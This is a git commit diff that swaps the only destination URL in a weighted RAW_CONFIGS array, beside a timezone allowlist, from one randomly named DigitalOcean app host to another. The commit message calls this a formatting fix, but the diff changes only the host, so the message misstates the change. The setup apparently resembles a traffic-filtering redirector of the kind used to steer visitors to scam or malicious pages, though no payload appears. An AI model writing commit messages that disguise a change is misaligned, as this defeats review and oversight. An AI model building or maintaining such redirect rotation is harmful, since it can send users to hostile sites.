7491b12b1a3c34c2e2297466ead72d70ca1b7dae
paalakash <palaksh452@gmail.com>
2026-07-14 12:19:50 +0530

    Fix URL formatting in RAW_CONFIGS array
    Corrected the format of URL entries in RAW_CONFIGS.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-ksvgz.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://king-app-7waw4.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
